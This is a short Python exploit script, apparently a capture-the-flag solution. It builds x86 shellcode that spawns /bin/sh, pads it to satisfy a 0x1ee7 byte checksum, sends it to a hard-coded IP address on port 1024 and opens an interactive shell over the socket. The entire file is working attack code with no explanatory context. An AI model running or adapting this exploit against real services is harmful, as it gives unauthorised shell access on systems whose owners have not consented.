#!/usr/bin/python

import socket
import telnetlib

host = "188.40.147.100"
port = 1024

shellcode = ""
shellcode += "\x90\x31\xc0\xb0\x0b\xbb\xfc\x91\x04\x08\x31\xc9"
shellcode += "\x89\xca\xcd\x80\x00\x00\x00\x00\x00\x00\x00\x00"
shellcode += "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
shellcode += "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
shellcode += "\x00\x00\x00\x00\x2f\x62\x69\x6e\x2f\x73\x68\x00"
shellcode += "\x97"

def fix_checksum(buff):
	cs = 0
	fixed = ""
	for i in range(0, 61):
		if cs == 0x1ee7:
			fixed += buff[i]
		else:
			if ord(buff[i]) == 0:
				if 0x1ee7 - cs >= 0xff:
					fixed += "\xff"
					cs += 0xff
				else:
					fixed += chr(0x1ee7 - cs)
					cs += 0x1ee7 - cs
			else:
				cs += ord(buff[i])
				fixed += buff[i]
	return fixed

sc = fix_checksum(shellcode)

s = socket.socket()
s.connect((host, port))
s.sendall(sc)

t = telnetlib.Telnet()
t.sock = s
t.interact()

